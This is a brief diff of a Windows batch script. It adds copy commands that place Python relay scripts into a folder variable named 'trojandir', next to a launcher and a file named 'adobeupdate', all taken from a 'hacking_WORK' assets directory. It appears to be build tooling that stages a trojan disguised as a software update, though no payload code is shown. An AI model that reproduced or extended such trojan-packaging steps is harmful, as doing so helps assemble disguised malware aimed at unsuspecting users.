@@ -13,6 +13,8 @@ del /f /q *.json
 del /f /q *.xml
 del /f /q download_*
 
+copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\pythonrelay.py %trojandir%
+copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\pythonhostrelay.py %trojandir%
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
 REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
